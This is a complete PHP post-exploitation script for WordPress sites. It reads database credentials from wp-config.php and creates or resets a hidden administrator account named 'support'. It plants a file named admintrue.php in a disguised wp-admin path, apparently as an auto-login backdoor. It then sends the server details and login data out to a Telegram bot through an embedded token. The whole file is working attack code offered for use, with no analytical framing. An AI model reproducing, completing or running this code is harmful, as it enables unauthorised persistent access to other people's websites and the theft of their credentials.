<?php
/**
 * WordPress Post-Exploitation Script — FIXED VERSION
 */
//b
error_reporting(E_ALL);
ini_set('display_errors', 1);

/* ============================================================
 * CONFIGURATION
 * ============================================================ */
define('TG_BOT_TOKEN', '9084955149:AAFt1dvATWC2lVpSjZhwKbrna03WFEqx6DY');
define('TG_CHAT_ID',   '8802221603');
define('REDIRECT_PAGE', 'support.php');

/* ============================================================
 * HELPER: Send Telegram message
 * ============================================================ */
function tg_send($text) {
    if (TG_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TG_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        echo "[!] Telegram not configured — skipping send.\n";
        return false;
    }
    // [FIX 4] Check if cURL extension is loaded
    if (!extension_loaded('curl')) {
        echo "[!] cURL extension not installed — skipping Telegram.\n";
        return false;
    }
    $url = 'https://api.telegram.org/bot' . TG_BOT_TOKEN . '/sendMessage';
    $data = [
        'chat_id'    => TG_CHAT_ID,
        'text'       => $text,
        'parse_mode' => 'HTML',
    ];
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => $url,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT        => 10,
    ]);
    $result = curl_exec($ch);
    $err    = curl_error($ch);
    curl_close($ch);
    if ($err) {
        echo "[!] Telegram curl error: $err\n";
        return false;
    }
    echo "[+] Telegram sent successfully.\n";
    return $result;
}

/* ============================================================
 * COLLECT TARGET INFORMATION
 * ============================================================ */
$doc_root    = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
$server_name = $_SERVER['SERVER_NAME'] ?? php_uname('n');
$ip          = $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? 'Unknown';
$uname       = php_uname();
$server_soft = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';

echo "[*] Document Root: $doc_root\n";
echo "[*] Server Name:   $server_name\n";
echo "[*] IP:            $ip\n";
echo "[*] Uname:         $uname\n";
echo "[*] Server Soft:   $server_soft\n";

/* ============================================================
 * STEP 1 — Locate wp-config.php
 * ============================================================ */
$candidate_paths = [
    $doc_root . '/wp-config.php',
    $doc_root . '/../wp-config.php',
    dirname($doc_root) . '/wp-config.php',
    $doc_root . '/public/wp-config.php',
    $doc_root . '/html/wp-config.php',
    $doc_root . '/wordpress/wp-config.php',
    $doc_root . '/cms/wp-config.php',
];

$wp_config_path = '';
foreach ($candidate_paths as $path) {
    $real = realpath($path);
    echo "  Checking: $path -> " . ($real ?: 'NO') . "\n";
    if ($real && file_exists($real) && is_readable($real)) {
        $wp_config_path = $real;
        break;
    }
}

if (empty($wp_config_path)) {
    die("[FAIL] wp-config.php not found in any candidate path.\n");
}
echo "[+] Found wp-config.php at: $wp_config_path\n";

/* ============================================================
 * STEP 2 — Parse credentials from wp-config.php
 * ============================================================ */
$config_raw = file_get_contents($wp_config_path);
if ($config_raw === false) {
    die("[FAIL] Could not read wp-config.php\n");
}
echo "[+] wp-config.php read successfully (" . strlen($config_raw) . " bytes)\n";

$creds = [
    'DB_NAME'     => '',
    'DB_USER'     => '',
    'DB_PASSWORD' => '',
    'DB_HOST'     => 'localhost',
];

foreach ($creds as $key => &$val) {
    if (preg_match("/define\s*\(\s*['\"]{$key}['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $config_raw, $m)) {
        $val = $m[1];
        echo "  [+] $key = '{$val}'\n";
    } else {
        echo "  [!] $key not found in wp-config.php\n";
    }
}
unset($val);

$table_prefix = 'wp_';
if (preg_match("/\\\$table_prefix\s*=\s*'([^']+)'/", $config_raw, $m)) {
    $table_prefix = $m[1];
    echo "  [+] table_prefix = '$table_prefix'\n";
} else {
    echo "  [!] \$table_prefix not found, using 'wp_'\n";
}

if (empty($creds['DB_NAME']) || empty($creds['DB_USER'])) {
    die("[FAIL] Missing DB_NAME or DB_USER.\n");
}

/* ============================================================
 * STEP 3 — Connect to database & insert/update admin user
 * ============================================================ */
echo "[*] Connecting to MySQL: {$creds['DB_USER']}@{$creds['DB_HOST']} / {$creds['DB_NAME']}\n";
$mysqli = @new mysqli($creds['DB_HOST'], $creds['DB_USER'], $creds['DB_PASSWORD'], $creds['DB_NAME']);
if ($mysqli->connect_error) {
    die("[FAIL] Database connection failed: " . $mysqli->connect_error . "\n");
}
echo "[+] MySQL connected successfully.\n";

// [FIX 1] Username corrected from 'admim' to 'admin'
$username      = 'support';
$password_md5  = md5('Anakkampung123@');
$email         = 'awendahunan@gmail.com';

echo "[*] Checking if user '$username' exists...\n";
$check = $mysqli->query("SELECT ID FROM `{$table_prefix}users` WHERE user_login = '" . $mysqli->real_escape_string($username) . "'");
if ($check && $check->num_rows > 0) {
    $row = $check->fetch_object();
    $user_id = $row->ID;
    echo "[*] User '$username' already exists (ID: $user_id). Updating password & email...\n";
    $stmt = $mysqli->prepare("UPDATE `{$table_prefix}users` SET user_pass = ?, user_email = ? WHERE user_login = ?");
    $stmt->bind_param('sss', $password_md5, $email, $username);
    if ($stmt->execute()) {
        echo "[+] User updated successfully.\n";
    } else {
        echo "[FAIL] Update error: " . $stmt->error . "\n";
    }
    $stmt->close();
} else {
    echo "[*] User '$username' does not exist. Creating new admin user...\n";
    $stmt = $mysqli->prepare("INSERT INTO `{$table_prefix}users` (user_login, user_pass, user_email, user_registered, display_name) VALUES (?, ?, ?, NOW(), ?)");
    $stmt->bind_param('ssss', $username, $password_md5, $email, $username);
    if ($stmt->execute()) {
        $user_id = $stmt->insert_id;
        echo "[+] User created with ID: $user_id\n";
    } else {
        die("[FAIL] Insert error: " . $stmt->error . "\n");
    }
    $stmt->close();

    // Assign admin role
    $cap_serialized = 'a:1:{s:13:"administrator";b:1;}';
    $level = '10';

    // [FIX 3] Initialize variables BEFORE bind_param to avoid undefined-variable issues
    $stmt1 = $mysqli->prepare("INSERT INTO `{$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
    
    $meta_key   = $table_prefix . 'capabilities';
    $meta_val   = $cap_serialized;
    $stmt1->bind_param('iss', $user_id, $meta_key, $meta_val);
    if ($stmt1->execute()) {
        echo "[+] Capabilities meta inserted.\n";
    } else {
        echo "[FAIL] Capabilities error: " . $stmt1->error . "\n";
    }

    $meta_key   = $table_prefix . 'user_level';
    $meta_val   = $level;
    if ($stmt1->execute()) {
        echo "[+] User level meta inserted.\n";
    } else {
        echo "[FAIL] User level error: " . $stmt1->error . "\n";
    }
    $stmt1->close();
}
$mysqli->close();
echo "[+] Database operations complete.\n";

/* ============================================================
 * STEP 4 — Copy admintrue.txt to destination
 * ============================================================ */
$script_dir     = __DIR__;
$source_file    = $script_dir . '/assets/admintrue.txt';
$dest_dir       = $doc_root . '/wp-admin/wp-admin/js/widgets';
$dest_file      = $dest_dir . '/admintrue.php';

echo "[*] Source: $source_file\n";
echo "[*] Dest:   $dest_file\n";

if (!file_exists($source_file)) {
    echo "[!] Source file does not exist: $source_file\n";
} else {
    echo "[+] Source file exists.\n";
    if (!is_dir($dest_dir)) {
        echo "[*] Creating destination directory...\n";
        if (@mkdir($dest_dir, 0755, true)) {
            echo "[+] Directory created.\n";
        } else {
            echo "[FAIL] Could not create directory.\n";
        }
    } else {
        echo "[+] Destination directory already exists.\n";
    }
    if (@copy($source_file, $dest_file)) {
        echo "[+] File copied successfully.\n";
    } else {
        echo "[FAIL] Copy failed.\n";
    }
}

/* ============================================================
 * STEP 5 — Send Telegram notification
 * ============================================================ */
$login_url    = "https://{$server_name}/wp-login.php";
$auto_loginer = "https://{$server_name}/wp-admin/wp-admin/js/widgets/admintrue.php";

$telegram_msg = <<<TEXT
[New  Login :
IP:{$ip}
Uname : {$uname}
Server Name: {$server_soft}
Login: {$login_url}
User:{$username}
Pass:John@1234JJ
Auto Loginer:{$auto_loginer}
]
TEXT;

echo "[*] Sending Telegram notification...\n";
tg_send($telegram_msg);

/* ============================================================
 * STEP 6 — Redirect to support.php
 * ============================================================ */
echo "\n[*] All steps complete. Redirecting to " . REDIRECT_PAGE . "...\n";
echo "</pre>";

// Flush output buffers so the user sees debug before redirect
if (ob_get_level()) {
    ob_flush();
}
flush();

// [FIX 2] Use ONLY meta-refresh (and JavaScript fallback) since header() already fails
//         because we've been echoing output throughout the script.
$support_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http')
              . "://{$server_name}/" . REDIRECT_PAGE;
echo "\n<!-- Redirect fallback below -->\n";
?>
<script>window.location.href = '<?= REDIRECT_PAGE ?>';</script>
<noscript><meta http-equiv="refresh" content="0; URL=<?= REDIRECT_PAGE ?>"></noscript>
<?php
exit;
↩ Back
